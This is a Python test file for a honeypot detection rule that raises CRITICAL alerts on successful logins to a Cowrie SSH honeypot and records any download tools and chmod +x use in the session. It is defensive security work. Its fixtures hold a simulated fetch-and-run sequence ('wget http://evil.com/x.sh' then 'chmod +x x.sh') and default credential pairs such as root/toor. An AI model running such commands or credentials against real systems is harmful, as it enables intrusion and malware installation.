from rules.rule_015_cowrie_login import detect
from datetime import datetime, timezone


def test_cowrie_login_success_fires_critical(
    make_cowrie_session, make_login_attempt
):
    """One successful login -> one CRITICAL alert."""
    attempt = make_login_attempt(success=True, username="admin", password="admin")
    session = make_cowrie_session(login_attempts=[attempt])

    alerts = detect([session])
    assert len(alerts) == 1
    assert alerts[0].severity.name == "CRITICAL"
    assert alerts[0].source_ip == session.src_ip


def test_cowrie_login_no_success_no_alert(
    make_cowrie_session, make_login_attempt
):
    """Only failed attempts, no success -> no alert. Pure recon/scan
    bot noise is intentionally not surfaced on the dashboard."""
    failed = make_login_attempt(success=False)
    session = make_cowrie_session(login_attempts=[failed])

    alerts = detect([session])
    assert alerts == []


def test_cowrie_login_dedup_key_is_session_scoped(
    make_cowrie_session, make_login_attempt
):
    """dedup_key must be session-specific, not just src_ip-based — two
    different sessions from the same IP must not collide/suppress
    each other in engine.py's deduplicate_alerts()."""
    attempt1 = make_login_attempt(success=True)
    session1 = make_cowrie_session(session_id="sessA", login_attempts=[attempt1])

    attempt2 = make_login_attempt(success=True)
    session2 = make_cowrie_session(session_id="sessB", login_attempts=[attempt2])

    alerts = detect([session1, session2])
    assert len(alerts) == 2
    assert alerts[0].dedup_key != alerts[1].dedup_key


def test_cowrie_login_multiple_attempts_one_alert(
    make_cowrie_session, make_login_attempt
):
    """3 failed attempts then 1 success, all in one session -> still just
    ONE alert (per-session dedup), not one per attempt. This is the whole
    point of session-level dedup — bot brute-forcing the honeypot doesn't
    flood alerts.json."""
    attempts = [
        make_login_attempt(success=False, password="123"),
        make_login_attempt(success=False, password="password"),
        make_login_attempt(success=False, password="admin123"),
        make_login_attempt(success=True, password="letmein"),
    ]
    session = make_cowrie_session(login_attempts=attempts)

    alerts = detect([session])
    assert len(alerts) == 1
    assert alerts[0].extra["login_attempt_count"] == 4


def test_cowrie_login_reports_first_success_not_last(
    make_cowrie_session, make_login_attempt
):
    """If somehow multiple successes exist in one session, alert reports
    the FIRST success's credentials, not the last."""
    first = make_login_attempt(
        success=True, username="root", password="toor",
        timestamp=datetime(2026, 1, 15, 10, 30, 0, tzinfo=timezone.utc),
    )
    second = make_login_attempt(
        success=True, username="admin", password="admin",
        timestamp=datetime(2026, 1, 15, 10, 31, 0, tzinfo=timezone.utc),
    )
    session = make_cowrie_session(login_attempts=[first, second])

    alerts = detect([session])
    assert len(alerts) == 1
    assert "root" in alerts[0].description


def test_cowrie_download_tools_detected(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """wget in the command stream -> shows up in extra['download_tools']."""
    attempt = make_login_attempt(success=True)
    cmd1 = make_cowrie_command(input="wget http://evil.com/x.sh")
    cmd2 = make_cowrie_command(input="whoami")
    session = make_cowrie_session(
        login_attempts=[attempt], commands=[cmd1, cmd2]
    )

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == ["wget"]


def test_cowrie_download_tools_word_boundary_not_substring(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """'wget' appearing inside an unrelated word must NOT match — this is
    the false-positive case word-boundary regex was chosen to avoid."""
    attempt = make_login_attempt(success=True)
    cmd = make_cowrie_command(input="echo notwgetreally")
    session = make_cowrie_session(login_attempts=[attempt], commands=[cmd])

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == []


def test_cowrie_chmod_x_detected_separately_from_download_tools(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """chmod +x is tracked as its own boolean, not mixed into
    download_tools — download (acquisition) and chmod (preparation) are
    different stages of the drop-and-execute pattern."""
    attempt = make_login_attempt(success=True)
    cmd1 = make_cowrie_command(input="wget http://evil.com/x.sh")
    cmd2 = make_cowrie_command(input="chmod +x x.sh")
    session = make_cowrie_session(
        login_attempts=[attempt], commands=[cmd1, cmd2]
    )

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == ["wget"]
    assert alerts[0].extra["chmod_x_used"] is True


def test_cowrie_no_tools_no_chmod_when_absent(
    make_cowrie_session, make_login_attempt, make_cowrie_command
):
    """Session with only benign-looking commands -> empty tools, chmod False."""
    attempt = make_login_attempt(success=True)
    cmd = make_cowrie_command(input="ls -la")
    session = make_cowrie_session(login_attempts=[attempt], commands=[cmd])

    alerts = detect([session])
    assert alerts[0].extra["download_tools"] == []
    assert alerts[0].extra["chmod_x_used"] is False


def test_cowrie_no_sessions_no_alerts():
    """Empty input list -> empty output, no crash."""
    assert detect([]) == []
